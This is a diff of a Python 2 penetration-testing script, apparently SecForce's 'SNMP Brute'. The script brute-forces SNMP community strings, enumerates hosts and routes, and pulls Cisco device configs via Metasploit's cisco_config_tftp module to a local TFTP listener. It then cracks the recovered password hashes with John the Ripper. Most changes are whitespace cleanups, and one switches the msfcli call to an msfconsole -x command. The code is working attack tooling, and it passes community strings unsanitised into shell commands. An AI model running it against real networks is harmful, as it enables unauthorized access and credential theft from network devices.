@@ -1,10 +1,10 @@
 #!/usr/bin/env python
 # Requires metasploit, snmpwalk, snmpstat and John the Ripper
-#   _____ _   ____  _______     ____             __     
-#  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
+#   _____ _   ____  _______     ____             __
+#  / ___// | / /  |/  / __ \   / __ )_______  __/ /____
 #  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 # ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
-#/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 
+#/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/
 #
 # SNMP Bruteforce & Enumeration Script
 # http://www.secforce.com / nikos.vassakis <at> secforce.com
@@ -256,7 +256,7 @@ def printout(text, colour=WHITE):
 
 
 ##########################################################################################################
-#	
+#
 ##########################################################################################################
 
 def banner(art=True):
@@ -296,7 +296,7 @@ def SNMPrecv(sock):
 		return response,addr
 	except:
 		raise
-		
+
 def SNMPsend(sock, packets, ip, port=defaults.port, community='', rate=defaults.rate):
 	addr = (ip, port)
 	for packet in packets:
@@ -377,7 +377,7 @@ def generic_snmpwalk(snmpwalk_args,oids):
 			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
 			entry={}
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
-					
+
 			print '\tINFO'
 			print '\t----\t'
 			for i in out:
@@ -392,15 +392,15 @@ def enumerateSNMPWalk(result,options):
 	snmpwalk_args=' -c "'+r.community+'" -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])
 
 	############################################################### 	Enumerate OS
-	if options.windows:	
+	if options.windows:
 		generic_snmpwalk(snmpwalk_args,WINDOWS_OIDS)
 		return
-	if options.linux:	
+	if options.linux:
 		generic_snmpwalk(snmpwalk_args,LINUX_OIDS)
 		return
-	if options.cisco:	
+	if options.cisco:
 		generic_snmpwalk(snmpwalk_args,CISCO_OIDS)
-	
+
 	############################################################### 	Enumerate CISCO Specific
 	############################################################### 	Enumerate Routes
 	entry={}
@@ -412,9 +412,9 @@ def enumerateSNMPWalk(result,options):
 		for key, val in RouteOIDS.items():	#Enumerate Routes
 			#print '\t *',val[1], val[0]
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+'| awk \'{print $NF}\' 2>&1').readlines()
-			
+
 			entry[val[1]]=out
-			
+
 
 		print '\tDestination\t\tNext Hop\tMask\t\t\tMetric\tInterface\tType\tProtocol\tAge'
 		print '\t-----------\t\t--------\t----\t\t\t------\t---------\t----\t--------\t---'
@@ -445,7 +445,7 @@ def enumerateSNMPWalk(result,options):
 			entry['MAC']=out[1*lines:2*lines]
 			entry['IP']=out[2*lines:3*lines]
 
-			
+
 			print '\tIP\t\tMAC\t\t\tV'
 			print '\t--\t\t---\t\t\t--'
 			for j in range(lines):
@@ -463,7 +463,7 @@ def enumerateSNMPWalk(result,options):
 			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
 			entry={}
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
-					
+
 			print '\tINFO'
 			print '\t----\t'
 			for i in out:
@@ -476,7 +476,7 @@ def enumerateSNMPWalk(result,options):
 		try:
 			printout(('################## Enumerating %s Table using: %s (%s)'%(key,val[0],val[1])),YELLOW)
 			out=os.popen('snmpnetstat'+snmpwalk_args+' '+val[0]).readlines()
-					
+
 			for i in out:
 				print '\t',i.strip()
 			print '\n'
@@ -487,7 +487,7 @@ def get_cisco_config(result,options):
 	printout(('################## Trying to get config with: %s'% result.community),YELLOW)
 
 	identified_ip=os.popen('ifconfig eth0 |grep "inet addr:" |cut -d ":" -f 2 |awk \'{ print $1 }\'').read()
-	
+
 	if options.interactive:
 		Local_ip = raw_input('Enter Local IP ['+str(identified_ip).strip()+']:') or identified_ip.strip()
 	else:
@@ -496,17 +496,17 @@ def get_cisco_config(result,options):
 	if not (os.path.isdir("./output")):
 		os.popen('mkdir output')
 
-	p=Popen('msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
-	
+	p=Popen('msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
 
-	print 'msfcli auxiliary/scanner/snmp/cisco_config_tftp RHOSTS='+str(result.addr[0])+' LHOST='+str(Local_ip)+' COMMUNITY="'+result.community+'" OUTPUTDIR=./output RETRIES=1 RPORT='+str(result.addr[1])+' THREADS=5 VERSION='+result.version.replace('v','')+' E '
+
+	print 'msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" '
 
 	out=[]
 	while p.poll() is None:
 		line=p.stdout.readline()
 		out.append(line)
 		print '\t',line.strip()
-	
+
 	printout('################## Passwords Found:',YELLOW)
 	encrypted=[]
 	for i in out:
@@ -522,17 +522,17 @@ def get_cisco_config(result,options):
 
 		#if (False if raw_input("(Y/n):").lower() == 'n' else True):
 		if not get_input("(Y/n):",'n',options):
-			
+
 			with open('./hashes', 'a') as f:
 				for i in encrypted:
 					f.write(i+'\n')
-			
+
 			p=Popen('john ./hashes',shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
 			while p.poll() is None:
 					print '\t',p.stdout.readline()
 			print 'Passwords Cracked:'
 			out=os.popen('john ./hashes --show').readlines()
-			for i in out: 
+			for i in out:
 				print '\t', i.strip()
 
 	out=[]
@@ -554,20 +554,20 @@ def select_community(results,options):
 				printout ('\t%s) %s %s (%s)(RO)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),BLUE)
 			else:
 				printout ('\t%s) %s %s (%s)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),RED)
-		
+
 			if default is None:
 				default = l
-		
+
 		if not options.enum:
 			return
-		
+
 		if options.interactive:
 			selection=raw_input("Select Community to Enumerate ["+str(default)+"]:")
 			if not selection:
 				selection=default
 		else:
 			selection=default
-			
+
 		try:
 			return results[int(selection)]
 		except:
@@ -580,11 +580,11 @@ def SNMPenumeration(result,options):
 	try:
 		printout (("\nEnumerating with READ-WRITE Community string: %s (%s)" % (result.community,result.version)),YELLOW)
 		enumerateSNMPWalk(result,options)
-		
+
 		if options.windows or options.linux:
 			if not get_input("Get Cisco Config (y/N):",'y',options):
 				getcisco=False
-		if getcisco: 
+		if getcisco:
 			get_cisco_config(result,options)
 	except KeyboardInterrupt:
 		print '\n'
@@ -595,11 +595,11 @@ def password_brutefore(options, communities, ips):
 	s.settimeout(options.timeOut)
 
 	results=[]
-	
+
 	#Start the listener
 	T = threading.Thread(name='listener', target=listener, args=(s,results,))
 	T.start()
-	
+
 	# Craft SNMP's for both versions
 	p1 = SNMP(
 		version=SNMPVersion.iversion('v1'),
@@ -628,7 +628,7 @@ def password_brutefore(options, communities, ips):
 					for ip in ips:
 						SNMPsend(s, packets, ip, options.port, community, options.rate)
 				except EOFError:
-					break				
+					break
 			except KeyboardInterrupt:
 				break
 
@@ -649,7 +649,7 @@ def password_brutefore(options, communities, ips):
 
 def get_input(string,non_default_option,options):
 	#(True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False)
-	
+
 	if options.interactive:
 		if raw_input(string).lower() == non_default_option:
 			return True
@@ -668,7 +668,7 @@ def main():
 	parser.add_option('-f','--file', help='Dictionary file', dest='dictionary', action='store')
 	parser.add_option('-t','--target', help='Host IP', dest='ip', action='store')
 	parser.add_option('-p','--port', help='SNMP port', dest='port', action='store', type='int',default=defaults.port)
-	
+
 
 	groupAlt = optparse.OptionGroup(parser, "Alternative Options")
 	groupAlt.add_option('-s','--stdin', help='Read communities from stdin', dest='stdin', action='store_true',default=False)
@@ -705,7 +705,7 @@ def main():
 	ips=[]
 
 	banner(options.colour)	#For SPARTA!!!
-	
+
 	if not options.ip and not options.lfile:
 		#Can't continue without target
 		parser.print_help()
@@ -774,11 +774,11 @@ def main():
 	#We identify whether the community strings are read or write
 	if results:
 		printout("\nTrying identified strings for READ-WRITE ...",WHITE)
-		testSNMPWrite(results,options)	
+		testSNMPWrite(results,options)
 	else:
 		printout("\nNo Community strings found",RED)
 		exit(0)
-	
+
 	#We attempt to enumerate the router
 	while options.enum:
 		SNMPenumeration(select_community(results,options),options)
@@ -788,10 +788,10 @@ def main():
 			continue
 		else:
 			break
-		
+
 	if not options.enum:
 		select_community(results,options)
-			
+
 		print "Finished!"
 
 if __name__ == "__main__":
